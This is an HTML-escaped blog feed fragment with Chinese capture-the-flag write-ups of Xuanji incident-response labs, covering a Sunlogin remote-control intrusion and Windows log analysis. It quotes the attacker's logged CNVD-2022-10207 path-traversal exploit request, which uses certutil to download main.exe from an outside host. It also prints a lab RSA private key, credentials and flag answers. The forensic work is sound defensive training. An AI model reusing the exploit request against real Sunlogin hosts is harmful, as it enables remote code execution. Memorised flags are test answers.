&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag6">flag6&lt;/h1>
&lt;p>&lt;strong>黑客下载了哪个文件，提交文件绝对路径&lt;/strong>&lt;br>
题目思路：这个与之前相同，直接查看流量包信息，解码后即可获得&lt;br>
1、右键编码“Value”位置，位置，点击“分组字节流”，开始位置调整为“2”，解码为调整为“Base64”，查看流量包执行的命令内容，得到黑客下在的文件名 &amp;ldquo;config.php&amp;rdquo;&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250326102613.png" alt="Pasted image 20250326102613">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">html&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【玄机靶场】第四章 windows 实战-向日葵</title><link>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows-%E5%AE%9E%E6%88%98-%E5%90%91%E6%97%A5%E8%91%B5/</link><pubDate>Fri, 05 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows-%E5%AE%9E%E6%88%98-%E5%90%91%E6%97%A5%E8%91%B5/</guid><description>&lt;img src="http://localhost:1313/images/40.webp" alt="Featured image of post 【玄机靶场】第四章 windows 实战-向日葵" />&lt;h1 id="简介">简介&lt;/h1>
&lt;p>第四章 windows实战&lt;br>
Administrator xj@123456&lt;/p>
&lt;h1 id="flag1">flag1&lt;/h1>
&lt;p>&lt;strong>通过本地 PC RDP到服务器并且找到黑客首次攻击成功的时间为多少,将黑客首次攻击成功的时间为作为 FLAG 提交(2028-03-26 08:11:25.123);&lt;/strong>&lt;br>
1.获取向日葵日志文件：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325135003.png" alt="Pasted image 20250325135003">&lt;br>
然后一个一个进行排查，发现sunlogin_service.20240321-191046文件内容比较多，拖出来进行分析：&lt;br>
先排查一下日志文件中有多少IP地址,每个IP有多少条日志：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">oE&lt;/span> &lt;span class="s1">&amp;#39;\b([0-9]{1,3}\.){3}[0-9]{1,3}\b&amp;#39;&lt;/span> &lt;span class="nx">xrk&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">log&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">sort&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">uniq&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">c&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325135111.png" alt="Pasted image 20250325135111">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">      2 0.0.0.0         
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">      2 1.1.1.1         
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">      4 127.0.0.1       
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">      2 127.1.1.1       
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    594 192.168.31.114  
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">   1696 192.168.31.45   
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">      1 192.168.52.150  
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">   1651 47.111.107.239  
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">   1660 47.111.169.221  
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">      1 47.111.228.106
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>排除掉一些默认地址，然后一个IP一个IP进行查。&lt;br>
发现192.168.31.45有很多恶意的访问路径。&lt;br>
分析下来发现是尝试在利用CNVD-2022-10207：向日葵远程控制软件 RCE 漏洞。&lt;br>
&lt;strong>CNVD-2022-10207&lt;/strong> 漏洞是一种远程命令执行漏洞，存在于向日葵远程控制软件中。攻击者可以通过特制的 HTTP 请求利用此漏洞，执行任意命令或代码。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">grep&lt;/span>  &lt;span class="s2">&amp;#34;192.168.31.45&amp;#34;&lt;/span> &lt;span class="nx">xrk&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">log&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325135521.png" alt="Pasted image 20250325135521">&lt;br>
提取时间：&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{2024-03-26 10:16:25.585}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag2">flag2&lt;/h1>
&lt;p>&lt;strong>通过本地 PC RDP到服务器并且找到黑客攻击的 IP 为多少,将黑客攻击 IP 作为 FLAG 提交;&lt;/strong>&lt;br>
根据flag1,可以看出黑客IP为：192.168.31.45&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">31.45&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag3">flag3&lt;/h1>
&lt;p>&lt;strong>通过本地 PC RDP到服务器并且找到黑客托管恶意程序 IP 为,将黑客托管恶意程序 IP 作为 FLAG 提交;&lt;/strong>&lt;br>
根据日志信息，可以看出：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325140253.png" alt="Pasted image 20250325140253">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325140213.png" alt="Pasted image 20250325140213">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">192.168.31.45:49329,/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe certutil -urlcache -split -f http://192.168.31.249/main.exe, plugin:check, session:sobGzXzWBfSlSbdqnmkUbJMLEjhssRx1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>&lt;strong>恶意活动指示&lt;/strong>：
&lt;ul>
&lt;li>&lt;strong>路径遍历&lt;/strong>：&lt;code>/check?cmd=ping....&lt;/code> 是一种路径遍历尝试，试图访问系统中的&lt;code>powershell.exe&lt;/code>。&lt;/li>
&lt;li>&lt;strong>命令执行&lt;/strong>：使用 &lt;code>certutil&lt;/code> 工具下载文件 &lt;code>main.exe&lt;/code>。&lt;/li>
&lt;li>&lt;strong>外部IP&lt;/strong>：下载源 &lt;code>http://192.168.31.249/main.exe&lt;/code> 指向一个可能托管恶意程序的外部服务器。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>恶意程序下载&lt;/strong>：
&lt;ul>
&lt;li>&lt;strong>工具使用&lt;/strong>：&lt;code>certutil&lt;/code> 是一个合法的Windows工具，但在这里被用于下载恶意文件，这是一个常见的攻击模式。&lt;/li>
&lt;li>&lt;strong>下载目标&lt;/strong>：目标文件 &lt;code>main.exe&lt;/code> 可能是恶意程序。&lt;br>
flag&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{192.168.31.249}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag4">flag4&lt;/h1>
&lt;p>&lt;strong>找到黑客解密 DEC 文件,将黑客DEC 文件的 md5 作为 FLAG 提交;&lt;/strong>&lt;br>
从日志里找一下DEC，看有没有信息&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325140738.png" alt="Pasted image 20250325140738">&lt;br>
但并没有找到这个文件信息。但是我们看日志，发现一个qq.txt文件。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325140823.png" alt="Pasted image 20250325140823">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">2024-03-26 10:39:11.031 - Info - [Acceptor][HTTP] new RC HTTP connection 192.168.31.45:49884, path: /check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe echo 647224830 &amp;gt; qq.txt, version: HTTP/1.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>搜索QQ群，发现了玄机的靶场群。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325140923.png" alt="Pasted image 20250325140923">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325141055.png" alt="Pasted image 20250325141055">&lt;br>
找到文件：&lt;br>
使用命令，对文件进行MD5加密&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">md5sum DEC.pem
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325141149.png" alt="Pasted image 20250325141149">&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{5ad8d202f80202f6d31e077fc9b0fc6b}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag5">flag5&lt;/h1>
&lt;p>&lt;strong>通过本地 PC RDP到服务器并且解密黑客勒索软件,将桌面加密文件中关键信息作为 FLAG 提交;&lt;/strong>&lt;br>
&lt;strong>先使用RSA解到密钥：&lt;/strong>&lt;br>
Flag4的DEC.pem文件就是rsa的私钥，不过格式需要稍加修改，将Private key改成大写即可&lt;br>
PEM格式密钥：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">-----BEGIN RSA PRIVATE KEY-----
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">MIICXQIBAAKBgQDWQqpkHRKtRu66MjTrNZC13A6rIlGaJBd/FYBy4ifiITasCnQE
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">J9aRTIYQsM5iincecnvY8xGYMg5pVTp6P4fxS4/+1bAEciRXSTCmLI8FeDd3sjOc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">HTw82sG0hfnnb0b/LFhbOCk7BgLnpwvSy5za/dtVQFSDbQbQuTBp029AKwIDAQAB
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">AoGBAKh6952NtvgGhQZpIG+sSUSX6/jqHZzFsKw/7idoatBIKcOS3LO/19udfvZ0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">8XVPSGfqwjRQvo8dHXP6juc+Odg1XOLPw4fjjJz9b9dLKCKwtIU3CwA1AmuhYNGp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1OXlHLyUaNVTN3TZN9Dn7txD4gOvLIirqbmhzy/N7PdPF5ThAkEA4MB++5DSY7Kv
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">MO1uHuxTr/jRy6754Mzgo0fpLBXSB13/nLMxRA6QEbigoAFpsFd36EYMKzftbezB
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gx2nphvLUwJBAPQMv730MqCWjaCPLgYRV+oMU6OnOMs6+ALql+I1eVqVfBAt+5De
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">HMxY7mWdaR9pofzuz+6KkmwRHqKSVw45dMkCQFJ68l76B+vkoFxxVe9tRU0YIE4C
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mdtA9NOXSWAPZfOkMHFeZZ8XRRHr0q7FtfasMuoAAuk9bhngQCgREvxnyNcCQGnt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">trQecHMfpe2Q+CsOEBi4rP0VsiMUP14UsUQwbbIRvD3Rl6WzotBXsXJNtrk5wmPk
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">zD//ybo6XA+4cSztZ3ECQQC92ck1XJm7V12SOFqHcNXFoS8tFvgNQXNEahmhJ2wb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">xTo0VwUhCeG1n8X5PqRn6Rcsh8YQAt924YrWtcTxrg8g
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----END RSA PRIVATE KEY-----
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>要加密的内容&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325142957.png" alt="Pasted image 20250325142957">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">N2xTZ2Bsn2Y5lve7KZ36bgsFjqncBs55VO0zkeEIr5Iga/kbegA0BAstotBWnZ16+trNfkzl3apUobodMkC8covEo22p+kWAyVjMRyJ98EQ4Pspr/Y5HIuH0xuvPa82j7b0AMJHkyd2viuymI/mrxjJk2X0xlEE4YVioMLd22+w=
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325142846.png" alt="Pasted image 20250325142846">&lt;br>
解密：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">NXVJSTQUAPGTXKSX
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>然后再AES解密：&lt;/strong>&lt;br>
需要解密的内容：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">0sWK8adKSGh1Xaxo6n1mZFoyNDYVokXwkBhxnzxU+MEJIV44u48SdOiFzWLn849hObaP6z26lLtMnXaDUnAPuMh+nF2hw9RoAsur7KYxE8/iY/y4jOEBsHT5wvQldcNfntrDyMUCvrWTUHl2yapUmaIIf2rZsNsqMVJ9puZzp58+FJmulyC7R1C2yoP1jHhsdOkU7htbzUWWsm2ybL+eVpXTFC+i6nuEBoAYhv2kjSgL8qKBFsLKmKQSn/ILRPaRYDFP/srEQzF7Y4yZa4cotpFTdGUVU547Eib/EaNuhTyzgOGKjXl2UYxHM/v0c3lgjO7GDA9eF3a/BBXPAgtK126lUfoGK7iSAhduRt5sRP4=
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>密钥：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">NXVJSTQUAPGTXKSX
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>iv偏移量是16个0&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325143151.png" alt="Pasted image 20250325143151">&lt;br>
获得答案：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">@suanve
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">时间是连续的，年份只是人类虚构出来用于统计的单位，2024年第一天和2023年最后一天，
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">不会有任何本质区别。你的花呗，你的客户,你的体检报告，窗外的寒风，都不会因为这是新的一年，
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">而停下对你的毒打。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">GIVE YOU FLAG!!!!!
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">flag{EDISEC_15c2e33e-b93f-452c-9523-bbb9e2090cd1}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">EDISEC_15c2e33e&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">b93f&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">452&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">9523&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">bbb9e2090cd1&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【玄机靶场】第四章-windows日志分析</title><link>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</link><pubDate>Fri, 05 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</guid><description>&lt;img src="http://localhost:1313/images/39.webp" alt="Featured image of post 【玄机靶场】第四章-windows日志分析" />&lt;h1 id="简介">简介&lt;/h1>
&lt;p>服务器场景操作系统 Windows7&lt;br>
服务器账号密码：winlog/winlog123&lt;br>
连接端口为：ip:3389&lt;br>
按照题目提示可以根据系统功能分析，或桌面工具进行辅助分析&lt;br>
注意：远控软件内IP为虚拟IP，如在进行进程中没有找到相关外连，应该是由于连接超时造成的断开了，重启环境服务器或软件即可继续对外发起请求，请见谅&lt;br>
注意：题目中shell如需在本地分析，提前关闭杀毒软件，会被杀掉，非免杀&lt;br>
注意：winlog用户在操作关于系统权限功能时，一定要使用管理员权限打开工具再去执行&lt;br>
如：cmd直接打开则可能无法进行操作系统权限性操作，需右击cmd-使用管理员权限打开，才可以，其它工具也如此&lt;/p>
&lt;h1 id="题目描述">题目描述&lt;/h1>
&lt;p>某台Windows服务器遭到攻击者入侵，管理员查看发现存在大量rdp爆破的请求，攻击者使用了不同位置的IP(此处模拟)，进行爆破并成功，并成功进入了系统，进入系统后又做了其它危害性操作，请根据各题目完成填写&lt;br>
题目来源公众号 州弟学安全&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">文档：https://mp.weixin.qq.com/s/eJpsOeaEczcPE-uipP7vCQ
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="靶场开启">靶场开启&lt;/h1>
&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321201520.png" alt="Pasted image 20250321201520">&lt;/p>
&lt;h1 id="步骤">步骤&lt;/h1>
&lt;h2 id="flag1">flag1&lt;/h2>
&lt;ol>
&lt;li>&lt;strong>审计桌面的logs日志，定位所有扫描IP，并提交扫描次数&lt;/strong>&lt;br>
直接把access.log文件拉出来，放kali中或者任意linux系统中查一下即可。&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">awk &amp;#39;{print $1}&amp;#39; access.log | sort | uniq -c | sort
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321203836.png" alt="Pasted image 20250321203836">&lt;br>
flag:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="mi">6385&lt;/span>&lt;span class="p">}&lt;/span>
